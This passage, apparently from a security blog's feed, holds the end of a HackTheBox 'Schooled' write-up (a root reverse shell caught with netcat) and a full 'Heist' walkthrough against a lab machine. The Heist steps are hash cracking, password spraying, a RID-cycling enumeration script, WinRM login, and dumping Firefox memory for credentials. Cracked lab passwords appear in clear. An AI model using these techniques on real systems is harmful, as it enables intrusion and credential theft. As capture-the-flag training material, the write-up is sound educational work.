</span></span><span class="line"><span class="cl">Number of packages to be installed: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>And I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
</span></span><span class="line"><span class="cl"><span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
</span></span><span class="line"><span class="cl">Schooled
</span></span><span class="line"><span class="cl">2462d8e2125d2a0
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Heist</title>
      <link>https://fahmifj.github.io/hackthebox/heist/</link>
      <pubDate>Wed, 28 Jul 2021 04:05:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/heist/</guid>
      <description>Learn how RID cycling could be used for enumerating AD users</description>
      <content:encoded><![CDATA[<p>Heist features a Help Desk-like system that allows a visitor to login as guest. Guest access allows me to read the ongoing issue and obtain an attached Cisco configuration file which contains usernames and passwords. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. Spraying these credentials returns an account that can be used for remote login into the system. The administrator password can be obtained from Firefox memory dump.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Password spray attack</li>
<li>Username enumeration via RPC using RID brute-force.</li>
<li>Process dump</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Hashcat</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers five open ports: an IIS Web server on port 80, MS-RPC on port 135 and port 49669, SMB on port 445, WinRM on port 5985.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nmap -p- -oA nmap/10-tcp-allport-heist 10.10.10.149
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:43 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.149
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> filtered ports
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">80/tcp    open  http
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
</span></span><span class="line"><span class="cl">49669/tcp open  unknown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 148.82 seconds
</span></span><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nmap -p80,135,445,5985,49669 -sC -sV -oA nmap/10-tcp-allport-script-heist 10.10.10.149
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:46 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.149
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.061s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Support Login Page
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was login.php
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 2m52s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-12T01:50:42
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 99.94 seconds
</span></span></code></pre></div><p>I probably won&rsquo;t touch MS-RPC on port 49669, but the one on port 135 is worth checking to detect PrintNightmare (which I already did in <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">this post</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Without credentials, I can&rsquo;t do much on SMB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.149
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website on port 80 presented with a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210712085020304.png" alt="image-20210712085020304"  /></div>
</p>
<p>No register button was found here, so I clicked the guest login and it brought me to the following page.</p>
<p><div class="img-container"><img src="imgs/image-20210712085409456.png" alt="image-20210712085409456"  /></div>
</p>
<p>From the chat above, user Hazard attached his Cisco configuration in a text file, and this config file contains several credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210712085452329.png" alt="image-20210712085452329"  /></div>
</p>
<p>I know this is not my business, but it looks like this part messed up his router 😅.</p>
<p><div class="img-container"><img src="imgs/image-20210726174927930.png" alt="image-20210726174927930"  /></div>
</p>
<p>So anyway, I will grab these credentials and also I will note that hazard asked the admin to create an account for accessing the files, which probably the SMB share.</p>
<h3 id="password-crack">Password Crack</h3>
<p>The first password can be recovered with <code>hashcat</code> (identified as md5crypt).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">500</span> hashes/heist-cisco.hash ../../rockyou.txt -O
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: md5crypt, MD5 <span class="o">(</span>Unix<span class="o">)</span>, Cisco-IOS <span class="nv">$1</span>$ <span class="o">(</span>MD5<span class="o">)</span>
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
</span></span><span class="line"><span class="cl">Time.Started.....: Mon Jul <span class="m">12</span> 08:58:28 <span class="m">2021</span> <span class="o">(</span><span class="m">2</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Mon Jul <span class="m">12</span> 08:58:30 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>../../rockyou.txt<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The rest of the passwords are encrypted with cisco type 7 encryption. These passwords can be decrypted using <a href="https://davidbombal.com/cisco-type-7-password-decryption/">this site</a> .</p>
<p><div class="img-container"><img src="imgs/image-20210712090727149.png" alt="image-20210712090727149"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210712090628350.png" alt="image-20210712090628350"  /></div>
</p>
<p>Now I have one password and two set of credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?:$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
</span></span><span class="line"><span class="cl">rout3r:0242114B0E143F015F5D1E161713:$uperP@ssword
</span></span><span class="line"><span class="cl">admin:02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-hazard">Access as Hazard</h3>
<h4 id="password-spray">Password Spray</h4>
<p>With user <code>hazard</code> included, I have three usernames and three passwords. I will use them to perform a password spray attack on SMB using <code>crackmapexec</code>. The results reveals that the password <code>stealth1agent</code>  works for user <code>hazard</code>, but it doesn&rsquo;t show &ldquo;Pwn3d!&rdquo; message, this means I have no access to WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.149 -u usernames.list -p passwords.list
</span></span><span class="line"><span class="cl">SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>+<span class="o">]</span> SupportDesk<span class="se">\h</span>azard:stealth1agent 
</span></span></code></pre></div><p>Another spray shows that user <code>hazard</code> can login into RPC servic as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ ./exploits/rpcspray.sh usernames.list passwords.list 10.10.10.149
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@stealth1agent 
</span></span><span class="line"><span class="cl">Account Name: Hazard, Authority Name: SUPPORTDESK
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@<span class="nv">$uperP</span>@ssword 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@stealth1agent 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@<span class="nv">$uperP</span>@ssword 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
</span></span><span class="line"><span class="cl">Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</span></span></code></pre></div><h4 id="user-enumeration-via-rpc">User Enumeration via RPC</h4>
<p>Since the share doesn&rsquo;t contain anything juicy, the other thing I can do with user hazard is enumeration on RPC.</p>
<p>Within <code>rpcclient</code> shell, <code>enumdomusers</code> is typically used to enumerate domain users, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ rpcclient -U <span class="s1">&#39;hazard%stealth1agent&#39;</span> 10.10.10.149                   
</span></span><span class="line"><span class="cl">rpcclient $&gt; srvinfo
</span></span><span class="line"><span class="cl">        10.10.10.149   Wk Sv NT SNT         
</span></span><span class="line"><span class="cl">        platform_id     :       <span class="m">500</span>
</span></span><span class="line"><span class="cl">        os version      :       10.0
</span></span><span class="line"><span class="cl">        server <span class="nb">type</span>     :       0x9003
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers
</span></span><span class="line"><span class="cl">result was NT_STATUS_CONNECTION_DISCONNECTED
</span></span></code></pre></div><p>Based on the result, the problem here was not the user&rsquo;s permissions. But, fortunately, the  <code>lookupnames</code>  command can be used to retrieve user&rsquo;s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">SID</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; lookupnames hazard
</span></span><span class="line"><span class="cl">hazard S-1-5-21-4254423774-1266059056-3197185112-1008 <span class="o">(</span>User: 1<span class="o">)</span>
</span></span></code></pre></div><p>Reverse lookups (SID to username) also works here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
</span></span><span class="line"><span class="cl">S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span>
</span></span></code></pre></div><p>In Windows system, excluding the RID section, this value <code>S-1-5-21-4254423774-1266059056-3197185112-[RID]</code>  is likely to be unique and is fixed for each computer domain. A normal user RID usually starts from 1000, and with this, I can enumerate the available users by incrementing the number.</p>
<p>The enumeration can be scripted using bash, and I&rsquo;ve created one to enumerate the first 20 users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">sid</span><span class="o">=</span><span class="s2">&#34;S-1-5-21-4254423774-1266059056-3197185112&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1000</span> 1020<span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl"> rpcclient -U <span class="s2">&#34;hazard%stealth1agent&#34;</span> -c <span class="s2">&#34;lookupsids </span><span class="nv">$sid</span><span class="s2">-</span><span class="nv">$i</span><span class="s2">;quit&#34;</span> 10.10.10.149 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><blockquote>
<p>Note: <code>enumdomusers</code> RID returns in hexadecimal, for example a builtin administrator account has a default RID of 500 in decimal, so in hex it&rsquo;s 0x1F4.</p>
</blockquote>
<p>I saved the script as <code>rpc-userenum.sh</code> and ran it, and it returned with three valid usernames. I will add these usernames to my username wordlist.</p>
<p><div class="img-container"><img src="imgs/image-20210712105959998-1627299069625.png" alt="image-20210712105959998"  /></div>
</p>
<h3 id="shell-as-chase">Shell as Chase</h3>
<h4 id="password-spray-1">Password Spray</h4>
<p>With updated username wordlist, I could do another password spray attack on WinRM. The results shows a &ldquo;Pwn3d!&rdquo; message for user <code>chase</code> with a password of <code>Q4)sJu\Y8qz*A3?d </code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ crackmapexec winrm 10.10.10.149 -u usernames.list -p passwords.list 
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:10.10.10.149<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> http://10.10.10.149:5985/wsman
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>+<span class="o">]</span> None<span class="se">\c</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</span></span></code></pre></div><h4 id="winrm---chase">WinRM - Chase</h4>
<p>I can login into the system with <code>chase</code>&rsquo;s credentials using <code>evil-winrm</code>. The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;chase&#39;</span> -p <span class="s1">&#39;Q4)sJu\Y8qz*A3?d&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
</span></span><span class="line"><span class="cl">supportdesk<span class="se">\c</span>hase
</span></span><span class="line"><span class="cl">SupportDesk
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Windows IP Configuration
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ethernet adapter Ethernet0 2:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Connection-specific DNS Suffix  . :
</span></span><span class="line"><span class="cl">   IPv6 Address. . . . . . . . . . . : dead:beef::5d4b:5294:9dc3:565c
</span></span><span class="line"><span class="cl">   Link-local IPv6 Address . . . . . : fe80::5d4b:5294:9dc3:565c%15
</span></span><span class="line"><span class="cl">   IPv4 Address. . . . . . . . . . . : 10.10.10.149
</span></span><span class="line"><span class="cl">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
</span></span><span class="line"><span class="cl">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
</span></span><span class="line"><span class="cl">                                       10.10.10.2
</span></span><span class="line"><span class="cl">a127d...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="tools-share">Tools Share</h4>
<p>Before going further, I would like to host my essential tools using <code>impacket-smbserver</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ impacket-smbserver ef ~/tools -smb2support -username ef -password ef
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.149,49708<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\e</span>f,SUPPORTDESK<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User SUPPORTDESK<span class="se">\e</span>f authenticated successfully
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The share then used on Heist. With this, I could use any of my tools directly from the share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> net use <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f /user:ef ef
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.14.83<span class="se">\e</span>f&gt; 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>chase</code>&rsquo;s Desktop there is another file called <code>todo.txt</code>. As the name implies, it contains to-do list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">type</span> todo.txt
</span></span><span class="line"><span class="cl">Stuff to-do:
</span></span><span class="line"><span class="cl">1. Keep checking the issues list.
</span></span><span class="line"><span class="cl">2. Fix the router config.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Done:
</span></span><span class="line"><span class="cl">1. Restricted access <span class="k">for</span> guest user.
</span></span></code></pre></div><p>While looking at the WinPEAS output, I noticed multiple Firefox processes were running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">  [+] Current TCP Listening Ports
</span></span><span class="line"><span class="cl">   [?] Check for services restricted from the outside 
</span></span><span class="line"><span class="cl">  Enumerating IPv4 connections
</span></span><span class="line"><span class="cl">         
</span></span><span class="line"><span class="cl">  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...[SNIP]...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49672         127.0.0.1             49673           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49673         127.0.0.1             49672           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49674         127.0.0.1             49675           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49675         127.0.0.1             49674           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49680         127.0.0.1             49681           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49681         127.0.0.1             49680           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49682         127.0.0.1             49683           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span><span class="line"><span class="cl">  TCP        127.0.0.1             49683         127.0.0.1             49682           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</span></span></code></pre></div><h4 id="dump-firefox-process">Dump Firefox Process</h4>
<p>I will employs <code>procdump64.exe</code> to dump the Firefox data from the memory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f<span class="se">\p</span>rocdump64.exe -accepteula -ma <span class="m">6868</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ProcDump v10.0 - Sysinternals process dump utility
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2020 Mark Russinovich and Andrew Richards
</span></span><span class="line"><span class="cl">Sysinternals - www.sysinternals.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> initiated: C:<span class="se">\i</span>amf<span class="se">\f</span>irefox.exe_210712_230707.dmp
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> writing: Estimated dump file size is <span class="m">535</span> MB.
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:08<span class="o">]</span> Dump <span class="m">1</span> complete: <span class="m">536</span> MB written in 1.5 seconds
</span></span><span class="line"><span class="cl"><span class="o">[</span>23:07:09<span class="o">]</span> Dump count reached.
</span></span></code></pre></div><p>Because I don&rsquo;t want to grab that fatty <code>536 MB</code> file,  I will use  <code>strings64.exe</code> and redirect the output to a text file to get some readable part from the dump file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; cmd /c <span class="s2">&#34;\\10.10.14.83\ef\strings64.exe -accepteula firefox.exe_210712_230707.dmp &gt; foxdump.txt&#34;</span>
</span></span><span class="line"><span class="cl">cmd.exe : 
</span></span><span class="line"><span class="cl">    + CategoryInfo          : NotSpecified: <span class="o">(</span>:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : NativeCommandError
</span></span><span class="line"><span class="cl">Strings v2.54 - Search <span class="k">for</span> ANSI and Unicode strings in binary images.
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> 1999-2021 Mark Russinovich
</span></span><span class="line"><span class="cl">Sysinternals - www.sysinternals.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\i</span>amf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
